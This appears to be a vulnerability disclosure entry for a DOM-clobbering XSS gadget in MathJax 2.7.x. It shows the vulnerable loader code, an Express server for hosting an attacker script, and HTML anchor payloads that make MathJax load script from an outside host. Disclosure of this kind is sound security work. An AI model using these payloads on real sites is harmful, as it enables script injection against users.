## MathJax

### Meta

+ Library: MathJax
+ Stars: 10.1K
+ Version: v2.7.x
+ Fingerprint: `MathJax.version == "2.7.2"`
+ Payload: ```<a id="MathJax"></a> <a id="MathJax" name="root" href="https://xxx.xxx.xxx"></a>```
+ Impact: XSS
+ CVE: N/A
+ Status: Accepted
+ Foundby: TheHulk


### Library

https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js
https://www.mathjax.org/MathJax-v2-7-9-available/

### Vulnerable Code Snippet

```javascript
if (document.getElementById && document.childNodes && document.createElement) {
    if (!(window.MathJax && MathJax.Hub)) {
        if (window.MathJax) {
            window.MathJax = {
                AuthorConfig: window.MathJax
            }
        } else {
            window.MathJax = {}
        }
```
```javascript
MathJax.Hub.Startup = {
    script: "",
    queue: MathJax.Callback.Queue(),
    signal: MathJax.Callback.Signal("Startup"),
    params: {},
    Config: function() {
        this.queue.Push(["Post", this.signal, "Begin Config"]);
        if (MathJax.AuthorConfig && MathJax.AuthorConfig.root) {
            MathJax.Ajax.config.root = MathJax.AuthorConfig.root
        }
```
```javascript
fileURL: function(j) {
  var i;
  while ((i = j.match(/^\[([-._a-z0-9]+)\]/i)) && b.hasOwnProperty(i[1])) {
      j = (b[i[1]] || this.config.root) + j.substr(i[1].length + 2) // Loading MathJax.AuthorConfig.root and type coercice to String
  }
  return j
}
```
```javascript
Load: function(k, m) {
  m = a.Callback(m);
  var l;
  if (k instanceof Object) {
      for (var j in k) {
          if (k.hasOwnProperty(j)) {
              l = j.toUpperCase();
              k = k[j]
          }
      }
  } else {
      l = k.split(/\./).pop().toUpperCase()
  }
  k = this.fileURL(k);
  if (this.loading[k]) {
      this.addHook(k, m)
  } else {
      this.head = h(this.head);
      if (this.loader[l]) {
          this.loader[l].call(this, k, m) // Calls loader['JS'] below

```

```javascript
loader: {
  JS: function(k, m) {
      var j = this.fileName(k);
      var i = document.createElement("script");
      var l = a.Callback(["loadTimeout", this, k]);
      this.loading[k] = {
          callback: m,
          timeout: setTimeout(l, this.timeout),
          status: this.STATUS.OK,
          script: i
      };
      this.loading[k].message = a.Message.File(j);
      i.onerror = l;
      i.type = "text/javascript";
      i.src = k + this.fileRev(j);
      this.head.appendChild(i)
  }
```

## PoC

Please note that for the following proof of concept, you will need to replace `xxx.xxx.xxx` with your own server address to host the malicious script and configure the URL to route `//config/TeX-AMS-MML_HTMLorMML.js`.
```
const express = require('express');
const path = require('path');

const app = express();
const port = 3000; 

// Middleware to normalize double slashes in the URL path
app.use((req, res, next) => {
  req.url = req.url.replace(/\/\//g, '/');
  next();
});

app.get('/config/TeX-AMS-MML_HTMLorMML.js', (req, res) => {
  const filePath = path.join(__dirname, 'poc', 'TeX-AMS-MML_HTMLorMML.js');
  res.sendFile(filePath);
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running at http://localhost:${port}`);
});
```


### PoC

```html
<!--Library-->
<script>
(function() {
        var script = document.createElement("script");
        script.type = "text/javascript";
        script.src = "https://mathjax.rstudio.com/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML";
        document.getElementsByTagName("head")[0].appendChild(script);
    }
)();
</script>
<!--Library-->

<!--Payload-->
<a id="MathJax"></a>
<a id="MathJax" name="root" href="http://localhost:9999"></a>
<!--Payload-->
```

### PoC #2
```html
<a id="MathJax"></a>
<a id="MathJax" name="root" href="http://xxx.xxx.xxx"></a>

<script id="MathJax-script" async src="https://mathjax.rstudio.com/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
```
